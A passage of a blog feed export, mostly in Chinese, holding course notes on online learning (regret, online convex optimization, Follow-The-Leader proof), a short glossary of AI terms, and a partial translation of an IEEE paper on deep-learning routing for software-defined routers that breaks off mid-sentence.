    <content><![CDATA[<h1 id="lecture-0"><a href="#lecture-0" class="headerlink" title="lecture 0"></a>lecture 0</h1><h2 id="Alpha-Go-深度学习-强化学习-蒙特卡洛树查询"><a href="#Alpha-Go-深度学习-强化学习-蒙特卡洛树查询" class="headerlink" title="Alpha Go: 深度学习+强化学习+蒙特卡洛树查询"></a>Alpha Go: 深度学习+强化学习+蒙特卡洛树查询</h2><ul><li>蒙特卡洛搜索树： 用于树遍历的具有PUCT功能的某些变体</li><li>残余卷积神经网络： 用于游戏评估和移动先验概率估计的政策和价值网络</li><li>强化学习： 用于通过自我游戏训练网络</li></ul><h2 id="深度学习vs在线学习"><a href="#深度学习vs在线学习" class="headerlink" title="深度学习vs在线学习"></a>深度学习vs在线学习</h2><ul><li>大多数深度学习模型可以在线学习</li><li>在线学习基于计算机实验</li><li>在线学习有更少的数学求导</li><li>深度学习更像CS&amp;CE类型的调查</li><li>在线学习属于统计机器学习一类</li><li>在线学习是数学类多学科的，属于应用数学和运筹学</li><li>受EE领域的研究者喜爱</li><li>可以证明很多定理并发表出版</li></ul><h3 id="为什么讲这个学科"><a href="#为什么讲这个学科" class="headerlink" title="为什么讲这个学科"></a>为什么讲这个学科</h3><ul><li>十分热门，在ECE主题中广泛应用</li><li>深度学习和在线学习都是十分热门的学科</li></ul><h2 id="课程介绍"><a href="#课程介绍" class="headerlink" title="课程介绍"></a>课程介绍</h2><ul><li>在线学习对于天气预报、股市趋势预测和那种广告显示在web页面这些随后的预测问题十分在行</li><li>在线学习算法观察一个例子流并对每个元素进行预测</li><li>算法收到每个预测快速的反馈并使用反馈来提升随后预测的准确度</li><li>与统计机器学习相比，在线学习算法不会对他们观察到的数据做出随机假设，甚至可以处理恶意攻击者生成数据的情况。</li><li>最近有一系列关于在线学习算法的科学研究，主要是因为它们广泛适用于网络规模的预测问题</li><li>本课程将对最先进的在线学习算法进行严格的介绍，重点是算法设计和理论分析。</li><li>主题包括：凸分析背景，遗憾最小化，在线优化，专家问题，部分反馈的在线学习和探索/利用权衡（a.k.a.强盗问题）和一系列高级主题</li></ul><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><p>本课程假设基本概率论和线性代数的背景。 关键数学概念将在使用前进行审核，但预计会有一定程度的数学成熟度。 该课程是理论性的，不涉及编程（但研究工作需要编程）</p><ul><li>凸优化理论初探</li><li>线性代数</li><li>概率论</li><li>一点信息论</li><li>matlab</li></ul><h2 id="在线梯度下降"><a href="#在线梯度下降" class="headerlink" title="在线梯度下降"></a>在线梯度下降</h2><ul><li><strong>遵循正则化的领导者</strong> 遵循正则化领导者（FTRL）算法族在某种程度上是在线学习中最基本的算法。 我们将使用通用且非常强大的引理来介绍和分析算法的简单实例。还将介绍凸分析的一些必要背景。</li><li><strong>在线梯度下降</strong> 在线梯度下降算法是随机梯度下降的近亲。 我们将对线性函数进行遗憾绑定分析，并展示相同的边界如何应用于自由到一般凸函数。可以立即为我们提供了逻辑回归和线性支持向量机的算法。</li><li><strong>自适应坐标学习率</strong> 这种对梯度下降的简单修改可以在大型数据集上产生显着更好的性能。我们通过一维示例说明全局学习率的问题，然后扩展前一讲的分析，以便在使用自适应坐标学习率时提供更严格的界限。</li></ul><h2 id="计划主题"><a href="#计划主题" class="headerlink" title="计划主题"></a>计划主题</h2><ul><li><strong>遵循近端正则化的领导者</strong> 我们表明，遵循正则化的领导者和在线梯度下降是密切相关的。 但是，他们的行为在某些重要方面有所不同。 我们展示了如何在FTRL上下文中更有效地实现用于产生稀疏模型的L1正则化（例如，Lasso算法）。</li><li><strong>遗憾的替代概念</strong> 到目前为止，我们通过将其性能与固定的最佳后见比较器进行比较来分析算法。 然而，对于某些应用，其他遗憾概念更合适，例如，当世界的“真实”模型正在发生变化时。</li><li><strong>镜像下降</strong> 镜像下降推广了在线梯度下降，并允许我们为许多其他问题开发算法。 我们考虑最好的专家问题，在每一轮我们必须从一组中选择一个“专家”，我们遵循这一轮的建议。</li><li><strong>强盗算法</strong> 用于k武装强盗问题的算法通过部分反馈扩展了最佳专家问题。</li><li>在每一轮中，您只能了解通过跟随您选择的专家获得的奖励; 你无法直接了解其他专家是否会更好。</li><li>例如，考虑在网页上向用户展示广告 - 我们将广告建模为“专家”，如果我们不选择展示广告，则无法知道用户是否会点击广告。</li><li><strong>高概率界限</strong> 到目前为止专家和强盗算法的大部分后悔限制只能保持预期; 算法使用随机化，如果我们运气不好，那么我们可以做的比我们应该的界限更糟糕。 但是，通过对算法的一些修改，我们可以设计出能够以高概率保证良好性能的算法。</li><li><strong>随机匪徒</strong> 到目前为止，引入的强盗算法没有对专家/行动的回报做出统计假设。 假设数据集分布是独立的并且相同地分布在i.i.d. 但是，我们不知道确切的分布函数。 如果我们知道奖励遵循一些（未知）分布，我们能获得更好的界限吗？</li><li><strong>对抗性强盗</strong>：数据集上的奖励分配可以任意改变</li><li><strong>上下文强盗</strong> 基本强盗算法必须在没有任何附加上下文的帮助下选择一个动作。 然而，上下文强盗算法可以在每次做出决定时利用关于世界当前状态的附加信息。 例如，在网页上放置广告时，我们可能会根据网页内容做出不同的决定。</li><li><strong>高级主题</strong> 高级主题可能包括对博弈论与在线学习之间关系的考察; 在线学习算法在批量机器学习问题中的应用; 组合结构的专家和强盗问题; 和选择性采样和标签效率。</li></ul><h1 id="lecture-1"><a href="#lecture-1" class="headerlink" title="lecture 1"></a>lecture 1</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在线预测可以被认为是一个玩家（也就是预测者，学习算法）和环境（也就是对手）之间的重复博弈。T表示游戏的轮数。 在每一轮$t(t = 1, …, T)$中，玩家和环境以下面的直观形式玩游戏</p><ul><li>环境：选择问题实例</li><li>玩家：对此实例进行预测</li><li>环境：对此预测造成$loss \in R$。 （玩家更喜欢较小的损失。）。 将有关预测准确性的反馈发送给玩家。</li><li>玩家：学习并记录反馈</li></ul><h3 id="示例：在线二进制预测游戏"><a href="#示例：在线二进制预测游戏" class="headerlink" title="示例：在线二进制预测游戏"></a>示例：在线二进制预测游戏</h3><p>在线二进制预测具有许多应用，例如电子邮件垃圾邮件分类，其可能不适合随机模型。 在此应用程序中，玩家会观察电子邮件的某些功能并进行二进制预测，无论是垃圾邮件还是非垃圾邮件。 以下是详细信息：每轮$t = 1, …, T $</p><ul><li>玩家观察一个由环境生成的实例的特征向量$x_t \in R^n $</li><li>玩家进行二进制预测$\widehat{y_t} \in \{+1, -1\} $<br>$ +1, -1$分别代表“垃圾邮件”和“非垃圾邮件”</li><li>玩家观察反馈$y_t \in \{+1, -1\} $</li><li>产生损失$\ell_t = l_{\widehat{y_t} \neq y_t} $</li></ul><p>几轮之后，累计损失是$\sum_{t = 1}^T\ell_t$。 直观地说，最终需要“小的”累积损失。<br>这里我们提出了二元预测游戏的等价定义。 对于$t = 1, …, T $，</p><ul><li>玩家从假设类$H$中选择一个假设（也就是二元分类器）$h_t$。<br>$$ h_t: R^n \rightarrow \{+1, -1\} $$<br>该假设是从特征向量$x \in R^n$映射到二进制预测集（例如$\{+1, -1\}$）的函数，在回合$t$中，$h_t$的选择可以基于$t$之前记录的所有信息。</li><li>环境选择$\{x_t, y_t\}$。</li><li>玩家遭受损失$\ell_t = l_{h(x_t) \neq y_t} $</li><li>让我们首先定义二元线性预测器和铰链损失函数。假设$h_w: R^n \rightarrow \{+1, -1\}$<br>$$ h_w(x) = sign(w \cdot x) = \left\{\begin{array}{ll}<br>+1 &amp; if w \cdot x &gt; 0 \\<br>-1 &amp; if w \cdot x &lt; 0<br>\end{array}\right. $$<br>称为二元线性预测器。 该假设的唯一参数是向量$w \in R^n$。</li><li>几何上，所有垂直于$w$的向量（即零内积）形成一个超平面$\{x: w \cdot x = 0\} $，如图1所示。数据可能属于半空间$\{x: w \cdot x &gt; 0\}$和$\{x: w \cdot x &lt; 0\}$之一。$ | w \cdot x |$可以解释为预测置信度。</li></ul><img src="/2019/01/02/2019-01-02-onlineMachineLearningNotes/2019_01_04_01.png" width="50%"><h3 id="示例：具有铰链损耗的在线二元线性预测器"><a href="#示例：具有铰链损耗的在线二元线性预测器" class="headerlink" title="示例：具有铰链损耗的在线二元线性预测器"></a>示例：具有铰链损耗的在线二元线性预测器</h3><ul><li>假设类$H$<br>$$ H = \{h_w(x): w \in R^n, ||w||_2 \leq 1\} $$<br>是二元线性预测变量的类。</li><li>已经提出了许多损失函数来对预测误差$\ell_t = l_{\widehat{y_t} \neq y_t}$进行惩罚仅仅是误差指示，或称为零丢失。铰链损失定义为<br>$$ l(w;(x_t, y_t)) = max\{0, 1 - y_tw \cdot x_t\} $$</li><li>如图2所示，铰链损失函数对错误预测（$ y_tw \cdot x_t &lt; 0 $）和具有小置信度（$ 0 \leq y_tw \cdot x_t &lt; 1 $）的正确预测施加惩罚。</li></ul><img src="/2019/01/02/2019-01-02-onlineMachineLearningNotes/2019_01_04_02.png" width="50%"><ul><li>具有铰链损耗的二元线性预测游戏可以如下呈现。对于$t = 1, …, T $<ul><li>玩家选择$w_t \in W $，其中$W = \{w \in R^n: ||w||_2 \leq 1\} $，$ R^n$中的单位球</li><li>环境选择$(x_t, y_t)$。</li><li>玩家输了损失$\ell_t(w_t; (x_t, y_t)) = max\{0, 1 - y_tw \cdot x_t \}$。 （$ x_t, y_t$被视为$\ell_t$的参数。）</li><li>玩家收到反馈$(x_t, y_t)$。</li></ul></li><li>此游戏设置可以概括为在线凸优化（OCO），将在下一节中讨论。</li></ul><h2 id="在线凸优化-OCO"><a href="#在线凸优化-OCO" class="headerlink" title="在线凸优化(OCO)"></a>在线凸优化(OCO)</h2><ul><li>对于$t = 1, …, T $<ul><li>玩家选择$w_t \in W$，其中$W$是$R^n$中的凸集。</li><li>环境选择凸损函数$f_t: W \rightarrow R $。</li><li>玩家输了损失$\ell_t = f_t(w_t) = f_t(w_t; (x_t, y_t))$。</li><li>玩家收到反馈$f_t $。</li></ul></li><li>假设：环境是对$w_1, …, w_T$是遗忘的（未察觉;不知道……），但可以任意定义$f_1, …, f_T$（可能是恶意的，即使完全了解玩家的算法，并具有无穷大的计算能力）</li><li>然后，最后，累积损失$\sum_{t = 1}^T \ell_t$可以任意大。 如何评估预测性能？ 什么是性能的良好基准？</li><li>一个好的选择是事后最佳固定（或静态）假设的累积损失，<br>$$ \min\limits_{w \in W} \sum_{t = 1}^{T}f_t(w) $$</li><li>要选择这个最好的固定假设，我们需要知道未来，即收集所有$f_1, …, f_T $，然后运行离线算法。</li><li>事后确定假设的实际累积损失与最小累积损失之间的差异被定义为遗憾，<br>$$ R(T) = \sum_{t = 1}^Tf_t(w_t) - \min\limits_{w \in W} \sum_{t = 1}^T f_t(w) $$<ul><li>如果后悔线性增长，$ R(T) = \Omega(T) $，玩家不会学习。</li><li>如果后悔亚线性增长，$ R(T) = o(T) $，玩家正在学习并且其预测准确性正在提高。</li><li>随着T进入无穷大，每轮的遗憾变为零<br>$$ \frac{1}{T}(\min\limits_{w \in W} \sum_{t = 1}^T f_t(w)) \rightarrow 0, T \rightarrow \infty $$</li><li>$R(T) = O(\sqrt{T}) $。</li></ul></li></ul><h2 id="在线学习与统计学习的比较"><a href="#在线学习与统计学习的比较" class="headerlink" title="在线学习与统计学习的比较"></a>在线学习与统计学习的比较</h2><table><tr><th></th><th>在线学习（OL）</th><th>统计学习（SL）</th></tr><tr><th rowspan="3">相同</th><td colspan="2">两者都定义了假设空间/类预测器（在在线学习的游戏的每一轮中，而在统计学习的训练过程中）</td></tr><tr><td colspan="2">两者都定义了损失函数来评估预测性能，并且优选小损失</td></tr><tr><td colspan="2">实例和标签</td></tr><tr><th rowspan="2">不同</th><td>在每轮比赛中学习，训练和测试之间没有区别</td><td>首先训练一个模型，然后进行测试</td></tr><tr><td>对手案</td><td>统计假设</td></tr></table><h1 id="lecture-2"><a href="#lecture-2" class="headerlink" title="lecture 2"></a>lecture 2</h1><h2 id="回顾在线凸优化算法"><a href="#回顾在线凸优化算法" class="headerlink" title="回顾在线凸优化算法"></a>回顾在线凸优化算法</h2><ul><li>对于$t = 1, 2, …, T $</li><li>玩家选择$w_t $</li><li>对手选择$f_t$（和玩家的决策同时）</li><li>玩家的损失$f_t(w_t)$计算</li><li>玩家观察$f_t $</li></ul><h2 id="真实世界的例子-谷歌搜索"><a href="#真实世界的例子-谷歌搜索" class="headerlink" title="真实世界的例子 - 谷歌搜索"></a>真实世界的例子 - 谷歌搜索</h2><h3 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h3><p>在课堂上，我们探索了一个真实的世界环境</p><ul><li>用户输入查询“烹饪的乐趣”。</li><li>Google的广告服务器回复了一系列要向用户展示的广告。</li><li>用户可能会点击其中一个广告。<br>然后我们可能会问以下问题。<br>Google如何决定向用户展示哪些广告？</li></ul><p>要确定此设置的在线学习方面，我们首先会探讨广告服务器运行的一些流程。 广告服务器执行以下过程：</p><ol><li>匹配关键字上的广告。 例如，关键字“烹饪”可以从用户的查询中提取，并且可以与与烹饪相关的广告匹配。</li><li>对于每个广告，我们计算要素$x \in R^n$，然后查询预测模型以估计广告被点击的概率。 请注意，这意味着我们会比实际展示的广告更多地匹配和预测广告。</li><li>运行拍卖，其考虑从上一步骤计算的点击概率，以及广告的货币价值。</li><li>选择要显示的广告。</li></ol><p>我们专注于学习问题，我们正在尝试预测特定用户点击广告的可能性。</p><h3 id="示例模型"><a href="#示例模型" class="headerlink" title="示例模型"></a>示例模型</h3><ul><li>在课堂上，我们假设了一个线性模型$w \in R^n$。</li><li>鉴于权重，我们可能会决定做出这样的预测：<br>$$ \hat{p} = w \cdot x $$</li><li>但是，由于我们试图预测概率，我们希望将预测标准化为0到1之间。</li><li>也就是说，我们需要一个函数$f(x)$，使得$f: R \rightarrow [0, 1]$。</li><li>我们也希望这个函数递增，因此更高的$x$将对应更高的概率。 实现此目的的常见函数是sigmoid函数$\sigma(x) = \frac{1}{1 + e^{-x}}$。</li></ul><img src="/2019/01/02/2019-01-02-onlineMachineLearningNotes/2019_01_05_03.png" width="50%"><ul><li>因此，我们预测概率如下：</li><li>请注意，这正是逻辑回归模型计算输入示例的类概率的方式。</li><li>为了学习模型，我们有一个接受$(x，y)$对的训练系统，其中$x$是广告的特征向量，$y$是相应的标签，在这种情况下表示用户是否点击了 广告</li><li>仍然使用逻辑回归模型，如果我们使用在线梯度下降来优化损失函数，训练过程将如此</li><li>（我们使用1来表示点击广告，否则为0，以便在使用在线梯度下降进行逻辑回归时进行数学运算。）</li></ul><table><thead><tr><th>训练过程 - 逻辑回归的SGD</th></tr></thead><tbody><tr><td>对于每一个$(x, y) $，<br>$\hat{p} = \sigma(w_t \cdot x)$<br>$g = (\hat{p} - y)x$<br>$w_{t + 1} \leftarrow w_t - \eta g$</td></tr></tbody></table><ul><li>请注意，在实际设置中，我们必须使用从训练过程中获得的新权重向量更新广告服务器使用的$w$。</li></ul><h3 id="问题和挑战"><a href="#问题和挑战" class="headerlink" title="问题和挑战"></a>问题和挑战</h3><p>在实际设置中，$ n $，特征向量的维度可以是数十亿的数量级。 除此之外，在线设置也带来了一些挑战：</p><ol><li>只需编写模型$w$就会占用太多空间。而且，我们想在那里寻找最好的模型</li><li>通过做一个正常的点积来天真地计算预测将太慢，特别是考虑到我们想要以数百毫秒的顺序向用户提供反馈的约束。<ul><li>幸运的是，即使$w$很密集，特征向量$x$通常也很稀疏。如果我们使用一袋单词表示，则尤其如此。</li><li>然后，计算$w \cdot x$将仅涉及与$x$中的非零元素的数量成比例的多个操作，而不是$n$。</li></ul></li><li>即使我们在$(x，y)$示例中表现良好，我们也必须记住，这些示例是从实际显示的广告中获得的。 因此，可能会出现一些未示出的广告实际上是好的。 与此相关的未来主题是探索。</li></ol><h3 id="映射回OCO"><a href="#映射回OCO" class="headerlink" title="映射回OCO"></a>映射回OCO</h3><ul><li>回到OCO公式，我们看到$w_t$是训练过程输出的权重向量。</li><li>由于我们选择使用逻辑回归作为模型，我们希望我们的损失函数与条件似然相关。</li><li>课堂上选择的具体形式是$f_t = log(1 + exp(-y_t(w \cdot x_t)))$。</li><li>课堂上评论说，这种损失功能可以看作是铰链损失的<strong>软版本</strong>。下图显示了这一点。</li></ul><img src="/2019/01/02/2019-01-02-onlineMachineLearningNotes/2019_01_05_04.png" width="50%"><ul><li>但是，也有一些观点认为OCO没有对给定示例的某些方面进行建模。例如，在玩家实际观察$f_t$之前有一段延迟，因为此信息仅在用户做出点击决定后才可用。</li></ul><h3 id="关于使用遗憾分析的评论"><a href="#关于使用遗憾分析的评论" class="headerlink" title="关于使用遗憾分析的评论"></a>关于使用遗憾分析的评论</h3><ul><li>要审核，<br>$$ Regret = \sum_{t}f_t(w_t) - \min\limits_{w \in W} \sum_{t} f_t(w) $$</li><li>在比较两种型号A和B时，我们注意到我们可以取消右侧的常数项：<br>$$ Regret(A) - Regret(B) = \sum_{t}f_t(A_t) - \sum_{t} f_t(B_t) = Loss(A) - Loss(B) $$</li><li>当使用遗憾作为优化的度量标准时，如果在对模型进行更改时$W$已经改变，我们必须要小心; 更高的遗憾可能误导我们认为模型比另一模型更糟，但这不一定是真的。</li></ul><h2 id="跟随领导者（FTL）算法"><a href="#跟随领导者（FTL）算法" class="headerlink" title="跟随领导者（FTL）算法"></a>跟随领导者（FTL）算法</h2><ul><li>我们探索在OCO框架中应用的第一个新算法是Follow-The-Leader，它被描述为最简单，最自然，最不实用的在线学习算法。 本节的大部分内容改编自Shai Shalev-Shwartz [1]的调查。</li></ul><table><thead><tr><th>Follow-The-Leader</th></tr></thead><tbody><tr><td>$w_1$是任意设定的<br>对于$t = 1, 2, …, T$<br>$w_t = \arg\min\limits_{w \in W} \sum_{s = 1}^{t - 1}f_s(w)$</td></tr></tbody></table><ul><li>查看算法有两种方法。<ol><li>我们正在围绕权重向量进行游戏，如果游戏在第$t - 1$轮停止，则最小化后悔。</li><li>我们将所有看到的例子用作批处理机器学习问题，并求解最佳权重向量。</li></ol></li><li>我们注意到，运行此算法的时间越长，算法越慢，因为批处理问题变得越来越大（不切实际）。</li><li>我们现在证明我们的第一个遗憾。 请注意，遗憾也可以表示为相对于所选择的向量，而不是仅仅事后与最佳模型进行比较。 在下面的引理中，$Regret(u)$表示对向量$u$的遗憾。</li><li>引理1.由FTL扮演的点$w_1, w_2, …, w_T$满足<br>$$ \forall u \in W, Regret(u) \leq \sum\nolimits_{t = 1}^{T} (f_t(w_t) - f_t(w_{t + 1})) $$</li></ul><h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><ul><li><strong>证明</strong>。 我们首先重述引理。替换$Regret(u)$的定义给出了以下等价声明：<br>$$ \sum\nolimits_{t = 1}^{T}(f_t(w_t) - f_t(u)) \leq \sum\nolimits_{t = 1}^{T}(f_t(w_t) - f_t(w_{t + 1})) $$</li><li>减少到<br>$$ \sum_{t = 1}^{T}f_t(w_{t + 1}) \leq \sum_{t = 1}^{T}f_t(u) $$</li><li>在课堂上，不等式左侧的表达式被称为Be-The-Leader（BTL）算法的累积损失，该算法通过查看下一个示例而作弊。 该术语由Kalai等人提出。[2]</li><li>我们现在用感应来证明<br>$$ \forall u \in W, \sum_{t = 1}^{T}f_t(w_{t + 1}) \leq \sum_{t = 1}^{T}f_t(u) $$</li><li><strong>基本情况</strong>。 对于任何$u$，$T = 1. f_1(w_2) \leq f_1(u)$都是真的，因为$w_2$使$f_1$最小化。回想起那个<br>$$ w_2 = \arg\min\limits_{w \in W} \sum\nolimits_{s = 1}^{2 - 1}f_s(w) = \arg\min\limits_{w \in W} f_1(w) $$</li><li><strong>归纳假设</strong>。我们假设上述陈述适用于时间$T - 1$，即<br>$$ \forall u \in W, \sum_{t = 1}^{T - 1}f_t(w_{t + 1}) \leq \sum_{t = 1}^{T - 1}f_t(u) $$</li><li><strong>归纳步骤</strong>。从上面的I.H.中，我们通过以下序列的等价不等式表明该陈述适用于时间T来完成归纳步骤：<br>$$ \begin{aligned}<br>\sum_{t = 1}^{T - 1}f_t(w_{t + 1}) &amp; \leq \sum_{t = 1}^{T - 1}f_t(u) \\<br>\sum_{t = 1}^{T - 1}f_t(w_{t + 1}) + f_T(w_{t + 1}) &amp; \leq \sum_{t = 1}^{T - 1}f_t(u) + f_T(w_{t + 1}) \\<br>\sum_{t = 1}^{T}f_t(w_{t + 1}) &amp; \leq \sum_{t = 1}^{T - 1}f_t(u) + f_T(w_{t + 1})<br>\end{aligned} $$</li><li>由于上述陈述适用于所有$u$，我们可以采用$u = w_{T + 1}$，这给了我们<br>$$ \sum_{t = 1}^{T}f_t(w_{t + 1}) \leq \sum_{t = 1}^{T}f_t(w_{T + 1}) $$</li><li>我们可以将不等式右侧的项视为向量的函数，$f(v) = \sum_{t = 1}^{T}f_t(v)$。在这种情况下，参数是$v = w_{T + 1}$。我们注意到$w_{T + 1}$恰好是$f(v)$的最小化。因此，对于所有$u$，$\sum_{t = 1}^{T}f_t(w_{T + 1}) \leq \sum_{t = 1}^{T}f_t(u)$。有了这个最终的不平等，我们就结束了归纳证明。</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul><li>我们现在探索一个FTL表现不佳的例子。</li><li><strong>示例1</strong> 假设$W \in [-1, 1], f_t(w) = g_t w$，其中$g_t \in [-1, 1]$由对手选择，并且玩家选择$w_t$。 我们还将$\sum_{s = 1}^{t} g_s$缩写为$g_{1 : t}$</li><li>下面我们展示一个玩家与FTL策略之间的任意选择$w_1 = 0$的游戏，以及一个想要让玩家产生损失的对手（请注意，对手也知道FTL策略是确定性的）。</li><li>我们还在右侧显示BTL策略进行比较。 我们考虑FTL策略在此设置下将采取的措施，其中所使用的点由下式给出<br>$$ \begin{aligned}<br>w_t &amp; = \arg\min\limits_{w \in [-1, 1]} \sum_{s = 1}^{t - 1}f_s(w) \\<br>&amp; = \arg\min\limits_{w \in [-1, 1]} \sum_{s = 1}^{t - 1} g_s w \\<br>&amp; = \arg\min\limits_{w \in [-1, 1]} g_{1 : t - 1} w<br>\end{aligned} $$</li><li>因此，FTL策略总是选择与$g_{1 : t - 1}$相反的符号，幅度为1。<img src="/2019/01/02/2019-01-02-onlineMachineLearningNotes/2019_01_10_05.png" width="50%"></li><li>FTL的遗憾是$(T - 1) - (-0.5) \approx T$，这很糟糕，因为我们希望遗憾是$o(T)$。</li><li>注意到BTL的累积损失是$\approx T$，使用我们刚刚证明的先前界限，我们得到了<br>$$ \forall u \in W, Regret(u) \leq (T - 0.5) - (-T + 0.5) = 2T - 1 $$</li><li>上限高于$T$，这使得这一遗憾成为弱势。</li><li>在本节课结束时，暗示通过跟随规则化领导算法，我们可以通过添加正则项来提高FTL算法的稳定性。 但这是为下一节课！</li><li>参考文献<br>[1] Shai Shalev-Shwartz，“在线学习和在线凸优化”，机器学习的基础和趋势，2012。<br>[2] Adam Kalai，Santosh Vempala，“在线决策问题的有效算法”，计算机与系统科学期刊，2005年。</li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
  </entry>
  <entry>
    <title>名词解释</title>
    <url>/2019/01/02/2019-01-02-glossary/</url>
    <content><![CDATA[<h1 id="AI方向"><a href="#AI方向" class="headerlink" title="AI方向"></a>AI方向</h1><ul><li>MCTS(Monte Carlo Tree Search) 蒙特卡洛搜索树</li><li>RL(Reinforcement learning) 强化学习</li><li>RCNN(Residual Convolutional Neural Networks) 残余卷积神经网络</li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>论文翻译——毕设任务</title>
    <url>/2018/12/27/2018-12-27-routeOrComputerTranslate/</url>
    <content><![CDATA[<h1 id="抬头"><a href="#抬头" class="headerlink" title="抬头"></a>抬头</h1><p>本文已在本期刊的未来期刊中被接受发表，但尚未完全编辑。 内容可能会在最终发布之前发生变化 引用信息：DOI 10.1109 / TC.2017.2709742，IEEE计算机上的交易</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>路由还是计算？基于深度学习的范式转向智能化计算机网络分组传输</p><h1 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h1><p>Bomin Mao，学生会员，IEEE，Zubair Md.Fadlullah，高级会员，IEEE，Fengxiao Tang，IEEE学生会员，Nei Kato，IEEE院士，Osamu Akashi，Takeru Inoue和Kimihiro Mizutani</p><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>近年来，软件定义路由器（SDR）（可编程路由器）已成为一种可行的解决方案，可提供具有易扩展性和可编程性的经济高效的数据包处理平台。多核平台显着地推动了SDR的并行计算能力，使他们能够采用人工智能技术，即深度学习来管理路由路径。在本文中，我们通过深度学习探索数据包处理的新机会，以便将计算需求从基于规则的路由计算转移到基于深度学习的路由估计，以实现高吞吐量数据包处理。尽管深度学习技术已在各种计算领域得到广泛应用，但迄今为止，研究人员还未能有效地利用基于深度学习的路由计算来实现高速核心网络。我们设想一个有监督的深度学习系统来构建路由表，并展示如何使用中央处理单元（CPU）和图形处理单元（GPU）将所提出的方法与可编程路由器集成。我们演示了我们独特的输入和输出流量模式如何通过分析和广泛的计算机模拟来增强基于深度学习的SDR的路由计算。值得一提的是，仿真结果表明我们的方案在延迟、吞吐量和信令开销方面优于基准方法。</p><h1 id="索引术语"><a href="#索引术语" class="headerlink" title="索引术语"></a>索引术语</h1><p>软件定义路由器，网络流量控制，深度学习，骨干网络，核心网络，路由。</p><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;互联网核心中的路由器见证了硬件的几代变化，而路由算法背后的主要思想在传统意义上非常相似。这是因为互联网核心和有线/无线异构骨干网络的构建方式多年来基本保持不变[1]。另一方面，为了适应网络流量的巨大增长，互联网核心基础设施通过添加更多/更大的路由器和更多/更快的链路而继续扩展。越来越大的核心网络推动核心路由器的架构在计算和交换容量方面更加强大。即使最近数据流量激增，网络运营商也面临着流量管理的挑战，以确保服务质量（QoS）以及处理利润下降[2]。传统上，运营商依赖于硬件解决方案以便改善核心网络性能，即通过简单地增加路由器和/或链路的数量和大小，这导致大量的投资挥霍。另一方面，交通管理的软件方面主要关注新路由策略的应用，这些策略在新一代功能强大的硬件架构出现之前可能是不可能的[3]。换句话说，由于连续变化的网络环境，软件驱动的路由策略的进步似乎总是落后于流行的路由策略。为了应用为不同网络服务开发的最先进的软件驱动路由算法，有必要提高核心路由器的可编程性。由于其专有的硬件架构，设计可编程路由器是一个具有挑战性的研究领域。因此，研究人员已经考虑使用软件定义路由器（SDR），其在商用硬件架构上部署可编程路由策略以执行分组处理和传输。作为软件定义网络（SDN）的关键组件，SDR不仅需要支持基于软件的数据包传输，还需要根据网络运营商的要求灵活地执行其他功能，以优化其网络。然而，最近涉及SDR的研究工作主要集中在增强其硬件方面，以便提高与基于硬件的路由器相当的处理吞吐量性能。例如，研究人员和网络制造商已经探索了基于多核的SDR [4]。虽然多核中央处理器（CPU）在相关研究领域占主导地位[5]，但图形处理单元（GPU）——加速SDR正在成为一项激动人心的研究领域。 这背后的原因是GPU同时运行数万个线程以有效处理数据包的固有能力[3]，[6]，[7]。 换句话说，GPU可以执行相同的程序以并行方式处理不同的数据集，这些数据也可以与多核CPU结合以同时进行不同的指令[8]。 GPU和CPU的协作可以显着提升SDR的数据包处理吞吐量[7]，可以将其视为现代骨干网的主流候选者。</p><ul><li>B. Mao，Z. M. Fadlullah，F. Tang和N. Kato在日本仙台东北大学信息科学研究生院工作。<br>电子邮件：{fbomin.mao，zubair，fengxiao.tang &amp; katog} @it.is.tohoku.ac.jp</li><li>O. Akashi，T. Inoue和K. Mizutani与日本电报电话公司（NTT）网络创新实验室合作。<br>电子邮件：{fakashi.osam，inoue.takeru，mizutani.kimihirog} @lab.ntt.co.jp</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了进一步完善骨干路由器硬件架构的研究，还需要改进网络流量控制策略，以满足近几十年来不断增长的流量需求[9]。这是因为良好的路由路径管理技术可以直接缓解（甚至克服）网络拥塞。在本文中，我们将重点放在分组路由策略的设计上。根据最大或最小度量值选择路径的基于规则的传统路由策略（例如，最短路径（SP）算法等）通常归因于显着慢收敛的缺点。此外，它们可能不是特别适合于多度量网络，因为难以手动估计多个度量之间的关系[10]。为了利用各种指标之间的复杂关系来决定最佳路径，基于机器学习的智能网络流量控制系统在广泛的网络环境中引起了广泛关注[11]，[12]。已经利用监督、无监督和强化学习技术来管理许多不同网络场景中的分组路由[13] - [15]，例如无线网状网络（WMN）[14]。然而，由于传统机器学习技术在处理多个网络参数时的低效率以及输入和输出特征化的困难，这些智能策略仍然基于规则的传统路由[16]，[17]。自2006年以来，已经见证了在深度学习架构（例如，多层神经网络）中已经实现了逐步突破，使得它们能够适应曾经只有人类占据主导地位的极其复杂的活动，例如谷歌的AlphaGo在复杂的棋盘游戏中的表现[18]。此外，GPU已经成为运行深度学习算法的最可行的硬件平台，因为它们具有高度并行的计算能力，而且还有各种GPU制造商提供的大量编程工具包[8]。因此，通过利用GPU加速的SDR来利用深度学习算法来实现智能网络流量控制（例如，智能路由管理）是可行的。</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_04_01.png" width="30%"> - 图1：最近的跨学科趋势表明涉及计算系统，计算机网络和机器智能的跨学科领域。 特别地，由于CPU / GPU技术的进步和深度学习，网络流量控制系统正变得健壮和智能<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们在本文中的工作贡献如下。首先，我们从三个方面探讨路由策略，即网络流量控制，深度学习和CPU / 